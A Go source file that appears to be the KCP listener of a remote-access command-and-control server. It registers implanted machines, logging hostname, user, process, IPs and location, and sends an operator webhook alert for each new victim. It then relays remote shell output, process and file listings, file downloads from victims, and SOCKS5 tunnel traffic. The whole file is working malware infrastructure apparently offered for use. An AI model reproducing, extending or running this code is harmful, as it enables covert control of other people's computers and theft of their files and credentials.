package kcp

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/logger"
	"BackendTemplate/pkg/qqwry"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/webhooks"
	"bufio"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/xtaci/kcp-go/v5"
)

// KCPClient KCP客户端结构
type KCPClient struct {
	Session       *kcp.UDPSession
	UID           string
	WriteMu       sync.Mutex
	StopChan      chan struct{}
	LastHeartbeat time.Time
	TimeoutCount  int
	IsClosed      bool
	CloseOnce     sync.Once
	Reader        *bufio.Reader
}

// KCPServer KCP服务器结构
type KCPServer struct {
	Listener net.Listener
	StopChan chan struct{}
}

// KCPClientManager KCP客户端管理器
type KCPClientManager struct {
	Clients map[string]*KCPClient
	Mu      sync.RWMutex
}

var (
	globalKCPClientManager = &KCPClientManager{
		Clients: make(map[string]*KCPClient),
	}
)

// Add 添加客户端到管理器
func (cm *KCPClientManager) Add(uid string, client *KCPClient) {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	cm.Clients[uid] = client
	logger.Info("KCP client added:", uid, "Total KCP clients:", len(cm.Clients))
}

// Remove 从管理器移除客户端
func (cm *KCPClientManager) Remove(uid string) {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	if client, exists := cm.Clients[uid]; exists {
		if !client.IsClosed {
			client.Close()
		}
		delete(cm.Clients, uid)
		logger.Info("KCP client removed:", uid, "Total KCP clients:", len(cm.Clients))
	}
}

// Get 获取客户端
func (cm *KCPClientManager) Get(uid string) (*KCPClient, bool) {
	cm.Mu.RLock()
	defer cm.Mu.RUnlock()
	client, exists := cm.Clients[uid]
	return client, exists
}

// CloseAll 关闭所有客户端
func (cm *KCPClientManager) CloseAll() {
	cm.Mu.Lock()
	defer cm.Mu.Unlock()
	for uid, client := range cm.Clients {
		if !client.IsClosed {
			client.Close()
		}
		delete(cm.Clients, uid)
	}
	logger.Info("All KCP clients closed")
}

// Close 安全关闭KCP客户端
func (c *KCPClient) Close() {
	c.CloseOnce.Do(func() {
		c.IsClosed = true

		// 关闭停止通道
		if c.StopChan != nil {
			close(c.StopChan)
		}

		// 关闭KCP会话
		if c.Session != nil {
			c.Session.Close()
		}

		// 从全局管理器移除
		if c.UID != "" {
			globalKCPClientManager.Remove(c.UID)
		}

		// 从连接类型管理器移除
		connection.MuClientListenerType.Lock()
		delete(connection.ClientListenerType, c.UID)
		connection.MuClientListenerType.Unlock()

		// 更新数据库状态为离线
		if c.UID != "" {
			database.Engine.Where("uid = ?", c.UID).Update(&database.Clients{Online: "2"})
			logger.Info("KCP client marked as offline:", c.UID)
		}

		logger.Info("KCP connection closed for client:", c.UID)
	})
}

// Write 安全发送数据
func (c *KCPClient) Write(data []byte) error {
	c.WriteMu.Lock()
	defer c.WriteMu.Unlock()

	if c.IsClosed {
		return fmt.Errorf("connection closed")
	}

	c.Session.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, err := c.Session.Write(data)
	return err
}

// WriteWithLength 发送带长度的消息
func (c *KCPClient) WriteWithLength(data []byte) error {
	// 创建带长度的消息
	length := uint32(len(data))
	buf := make([]byte, 4+len(data))
	binary.BigEndian.PutUint32(buf[:4], length)
	copy(buf[4:], data)

	return c.Write(buf)
}

// startHeartbeatCheck 启动心跳检查
func (c *KCPClient) startHeartbeatCheck() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("KCP heartbeat checker panic recovered:", r)
		}
	}()

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if c.IsClosed {
				return
			}

			// 检查KCP连接状态
			//stats := c.Session.GetStats()
			//logger.Debug("KCP stats for client:", c.UID,
			//	"BytesSent:", stats.BytesSent,
			//	"BytesReceived:", stats.BytesReceived,
			//	"MaxConn:", stats.MaxConn,
			//	"ActiveOpens:", stats.ActiveOpens,
			//	"PassiveOpens:", stats.PassiveOpens,
			//	"CurrEstab:", stats.CurrEstab,
			//	"InErrs:", stats.InErrs,
			//)

			// 检查心跳是否超时
			if time.Since(c.LastHeartbeat) > 30*time.Second {
				c.TimeoutCount++
				logger.Warn("KCP heartbeat timeout for client:", c.UID, "Timeout count:", c.TimeoutCount)

				if c.TimeoutCount >= 3 {
					logger.Info("Max KCP heartbeat timeout reached, closing connection for client:", c.UID)
					c.Close()
					return
				}
			}

			// 可选：发送心跳检查包
			if c.TimeoutCount > 0 {
				heartbeatMsg := make([]byte, 8)
				binary.BigEndian.PutUint32(heartbeatMsg[:4], 3) // 心跳类型
				binary.BigEndian.PutUint32(heartbeatMsg[4:], 0) // 空内容
				c.Write(heartbeatMsg)
			}

		case <-c.StopChan:
			return
		}
	}
}

// HandleKCPConnection 处理KCP连接
func HandleKCPConnection(session *kcp.UDPSession) {
	remoteAddr := session.RemoteAddr()
	logger.Info("New KCP connection from:", remoteAddr)

	// 创建客户端对象
	client := &KCPClient{
		Session:       session,
		StopChan:      make(chan struct{}),
		LastHeartbeat: time.Now(),
		IsClosed:      false,
		Reader:        bufio.NewReader(session),
	}

	defer func() {
		// 确保连接被关闭
		client.Close()
		logger.Info("KCP handler finished for:", remoteAddr)
	}()

	// 设置KCP会话参数
	session.SetStreamMode(true)
	session.SetWindowSize(1024, 1024)
	session.SetNoDelay(1, 10, 2, 1)
	session.SetDeadline(time.Now().Add(60 * time.Second))

	// 主消息处理循环
	for {
		if client.IsClosed {
			break
		}

		// 重置读取超时
		session.SetReadDeadline(time.Now().Add(60 * time.Second))

		// 读取消息长度
		var length uint32
		err := binary.Read(client.Reader, binary.BigEndian, &length)
		if err != nil {
			if err == io.EOF {
				logger.Info("KCP client closed connection:", remoteAddr)
			} else if strings.Contains(err.Error(), "i/o timeout") {
				logger.Info("KCP read timeout for:", remoteAddr)
				continue
			} else {
				logger.Error("KCP error reading message length:", err, "from:", remoteAddr)
			}
			break
		}

		// 验证消息长度
		if length > 10*1024*1024 { // 限制为10MB
			logger.Error("KCP message too large:", length, "from:", remoteAddr)
			break
		}

		if length == 0 {
			logger.Warn("KCP received zero-length message from:", remoteAddr)
			continue
		}

		// 读取消息内容
		message := make([]byte, length)
		_, err = io.ReadFull(client.Reader, message)
		if err != nil {
			if err == io.EOF {
				logger.Info("KCP client closed connection while reading:", remoteAddr)
			} else {
				logger.Error("KCP error reading message content:", err, "from:", remoteAddr)
			}
			break
		}

		// 处理消息
		if len(message) < 4 {
			logger.Error("KCP message too short from:", remoteAddr)
			continue
		}

		msgTypeBytes := message[:4]
		msgType := binary.BigEndian.Uint32(msgTypeBytes)

		switch msgType {
		case 1: // firstBlood
			msg := message[4:]
			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logger.Error("KCP DecodeBase64 failed:", err)
				continue
			}

			metainfo, err := encrypt.Decrypt(tmpMetainfo)
			if err != nil {
				logger.Error("KCP Decrypt failed:", err)
				continue
			}

			uid := encrypt.BytesToMD5(metainfo)
			client.UID = uid
			client.LastHeartbeat = time.Now()
			client.TimeoutCount = 0

			// 添加到全局管理器
			globalKCPClientManager.Add(uid, client)

			// 更新连接类型
			connection.MuClientListenerType.Lock()
			connection.ClientListenerType[uid] = "kcp"
			connection.MuClientListenerType.Unlock()

			// 启动心跳检查
			go client.startHeartbeatCheck()

			// 检查客户端是否已存在
			var existingClient database.Clients
			exists, _ := database.Engine.Where("uid = ?", uid).Get(&existingClient)

			if !exists { // FirstBlood
				processID := binary.BigEndian.Uint32(metainfo[:4])
				flag := int(metainfo[4:5][0])
				ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
				localIP := utils.Uint32ToIP(ipInt).String()
				osInfo := string(metainfo[9:])

				osArray := strings.Split(osInfo, "\t")
				hostName := osArray[0]
				UserName := osArray[1]
				processName := osArray[2]

				// 获取外网IP
				remoteAddr := session.RemoteAddr().String()
				externalIp, _, err := net.SplitHostPort(remoteAddr)
				if err != nil {
					externalIp = remoteAddr
				}
				if externalIp == "::1" {
					externalIp = "127.0.0.1"
				}
				address, _ := qqwry.GetLocationByIP(externalIp)

				currentTime := time.Now()
				timeFormat := "01-02 15:04"
				formattedTime := currentTime.Format(timeFormat)

				arch := "x86"

				if flag > 8 {
					UserName += "*"
					flag = flag - 8
				}
				if flag > 4 {
					arch = "x64"
				}

				// 创建新客户端记录
				c := database.Clients{
					Uid:        uid,
					FirstStart: formattedTime,
					ExternalIP: externalIp,
					InternalIP: localIP,
					Username:   UserName,
					Computer:   hostName,
					Process:    processName,
					Pid:        strconv.Itoa(int(processID)),
					Address:    address,
					Arch:       arch,
					Note:       "",
					Sleep:      "0",
					Online:     "1",
					Color:      "",
				}

				// 插入数据库
				if _, err := database.Engine.Insert(&c); err != nil {
					logger.Error("KCP failed to insert client:", err)
				}

				// 插入相关表
				database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
				database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})

				// 发送Webhook通知
				if exists, key := webhooks.CheckEnable(); exists {
					webhooks.SendWecom(c, key)
				}

				logger.Info("New KCP client registered:", uid, "IP:", externalIp)
			} else {
				// 更新在线状态
				database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "1"})
				logger.Info("KCP client reconnected:", uid)
			}

		case 2: // otherMsg
			msg := message[4:]
			if len(msg) < 4 {
				logger.Error("KCP OtherMsg too short")
				continue
			}

			metaLen := binary.BigEndian.Uint32(msg[:4])
			if len(msg) < int(4+metaLen) {
				logger.Error("KCP invalid meta length")
				continue
			}

			metaMsg := msg[4 : 4+metaLen]
			realMsg := msg[4+metaLen:]

			tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
			if err != nil {
				logger.Error("KCP DecodeBase64 failed:", err)
				continue
			}

			metainfo, err := encrypt.Decrypt(tmpMetainfo)
			if err != nil {
				logger.Error("KCP Decrypt failed:", err)
				continue
			}

			uid := encrypt.BytesToMD5(metainfo)

			// 检查客户端是否在线
			if _, exists := globalKCPClientManager.Get(uid); !exists {
				logger.Warn("KCP received message from offline client:", uid)
				continue
			}

			dataBytes, err := encrypt.DecodeBase64(realMsg)
			if err != nil {
				logger.Error("KCP DecodeBase64 failed:", err)
				continue
			}

			dataBytes, err = encrypt.Decrypt(dataBytes)
			if err != nil {
				logger.Error("KCP first decrypt failed:", err)
				continue
			}

			dataBytes, err = encrypt.Decrypt(dataBytes)
			if err != nil {
				logger.Error("KCP second decrypt failed:", err)
				continue
			}

			if len(dataBytes) < 4 {
				logger.Error("KCP decrypted data too short")
				continue
			}

			replyTypeBytes := dataBytes[:4]
			data := dataBytes[4:]
			replyType := binary.BigEndian.Uint32(replyTypeBytes)

			switch replyType {
			case 0: // 命令行展示
				var shell database.Shell
				if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
					shell.ShellContent += string(data) + "\n"
					database.Engine.Where("uid = ?", uid).Update(&shell)
				}

			case 31: // 错误展示
				var shell database.Shell
				if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
					shell.ShellContent += "!Error: " + string(data) + "\n"
					database.Engine.Where("uid = ?", uid).Update(&shell)
				}

			case command.PS:
				command.VarPidQueue.Add(uid, string(data))

			case command.FileBrowse:
				command.VarFileBrowserQueue.Add(uid, string(data))

			case 22: // 文件下载第一条信息
				if len(data) < 4 {
					logger.Error("KCP file download info too short")
					break
				}

				fileLen := int(binary.BigEndian.Uint32(data[:4]))
				filePath := string(data[4:])

				// 使用安全路径函数
				fullPath, err := utils.GetSafeFilePath(uid, filePath)
				if err != nil {
					logger.Error("KCP security check failed:", err)
					break
				}

				// 确保下载目录存在
				downloadDir := filepath.Dir(fullPath)
				if err := os.MkdirAll(downloadDir, 0755); err != nil {
					logger.Error("KCP failed to create download directory:", err)
					break
				}

				// 更新数据库
				sql := `
UPDATE downloads
SET file_size = ?, downloaded_size = ?
WHERE uid = ? AND file_path = ?;
`
				_, err = database.Engine.QueryString(sql, fileLen, 0, uid, filePath)
				if err != nil {
					logger.Error("KCP database update failed:", err)
				}

				// 检查并删除已存在的文件
				if _, err := os.Stat(fullPath); err == nil {
					if err := os.Remove(fullPath); err != nil {
						logger.Error("KCP failed to remove existing file:", err)
						break
					}
				}

				// 创建新文件
				fp, err := os.OpenFile(fullPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
				if err != nil {
					logger.Error("KCP failed to create file:", err)
					break
				}
				fp.Close()

			case command.DOWNLOAD: // 文件下载
				if len(data) < 4 {
					logger.Error("KCP download data too short")
					break
				}

				filePathLen := int(binary.BigEndian.Uint32(data[:4]))
				if len(data) < 4+filePathLen {
					logger.Error("KCP invalid file path length in download")
					break
				}

				filePath := string(data[4 : 4+filePathLen])
				fileContent := data[4+filePathLen:]

				// 使用安全路径函数
				fullPath, err := utils.GetSafeFilePath(uid, filePath)
				if err != nil {
					logger.Error("KCP security check failed:", err)
					break
				}

				var fileDownloads database.Downloads
				if _, err := database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads); err == nil {
					fileDownloads.DownloadedSize += len(fileContent)
					database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Update(&fileDownloads)
				}

				// 确保目录存在
				downloadDir := filepath.Dir(fullPath)
				if err := os.MkdirAll(downloadDir, 0755); err != nil {
					logger.Error("KCP failed to create download directory:", err)
					break
				}

				// 追加文件内容
				fp, err := os.OpenFile(fullPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
				if err != nil {
					logger.Error("KCP failed to open file:", err)
					break
				}

				if _, err := fp.Write(fileContent); err != nil {
					logger.Error("KCP failed to write file content:", err)
				}
				fp.Close()

			case command.DRIVES:
				drives := utils.GetExistingDrives(data)
				command.VarDrivesQueue.Add(uid, drives)

			case command.FileContent:
				if len(data) < 4 {
					logger.Error("KCP file content data too short")
					break
				}

				filePathLen := int(binary.BigEndian.Uint32(data[:4]))
				if len(data) < 4+filePathLen {
					logger.Error("KCP invalid file path length in file content")
					break
				}

				filePath := string(data[4 : 4+filePathLen])
				fileContent := data[4+filePathLen:]
				command.VarFileContentQueue.Add(uid, filePath, string(fileContent))

			case command.Socks5Data:
				if len(data) < 16 {
					logger.Error("KCP socks5 data too short")
					break
				}

				md5sign := data[:16]
				rawData := data[16:]
				command.VarSocks5Queue.Add(uid, fmt.Sprintf("%x", md5sign), string(rawData))

			default:
				logger.Warn("KCP unknown reply type:", replyType)
			}

		case 3: // heartBeat
			msg := message[4:]
			tmpMetainfo, err := encrypt.DecodeBase64(msg)
			if err != nil {
				logger.Error("KCP DecodeBase64 failed:", err)
				continue
			}

			metainfo, err := encrypt.Decrypt(tmpMetainfo)
			if err != nil {
				logger.Error("KCP Decrypt failed:", err)
				continue
			}

			uid := encrypt.BytesToMD5(metainfo)

			// 更新心跳时间
			if c, exists := globalKCPClientManager.Get(uid); exists && !c.IsClosed {
				c.LastHeartbeat = time.Now()
				c.TimeoutCount = 0
			}

		default:
			logger.Warn("KCP unknown message type:", msgType)
		}
	}
}

// Cleanup 全局清理函数
func Cleanup() {
	logger.Info("Starting KCP cleanup...")
	globalKCPClientManager.CloseAll()
	logger.Info("KCP cleanup completed")
}

// GetClientStats 获取客户端统计信息
func GetClientStats() map[string]interface{} {
	globalKCPClientManager.Mu.RLock()
	defer globalKCPClientManager.Mu.RUnlock()

	stats := make(map[string]interface{})
	stats["total_kcp_clients"] = len(globalKCPClientManager.Clients)

	onlineCount := 0
	for _, client := range globalKCPClientManager.Clients {
		if !client.IsClosed {
			onlineCount++
		}
	}
	stats["online_kcp_clients"] = onlineCount

	return stats
}

// GetClient 获取指定KCP客户端
func GetClient(uid string) *KCPClient {
	if client, exists := globalKCPClientManager.Get(uid); exists && !client.IsClosed {
		return client
	}
	return nil
}

// SendToClient 向指定KCP客户端发送消息
func SendToClient(uid string, message []byte) error {
	client := GetClient(uid)
	if client == nil {
		return fmt.Errorf("KCP client not found or offline")
	}

	return client.Write(message)
}

// BroadcastToAll 广播消息给所有KCP客户端
func BroadcastToAll(message []byte) {
	globalKCPClientManager.Mu.RLock()
	defer globalKCPClientManager.Mu.RUnlock()

	for uid, client := range globalKCPClientManager.Clients {
		if !client.IsClosed {
			if err := client.Write(message); err != nil {
				logger.Error("KCP failed to broadcast to client:", uid, "Error:", err)
			}
		}
	}
}
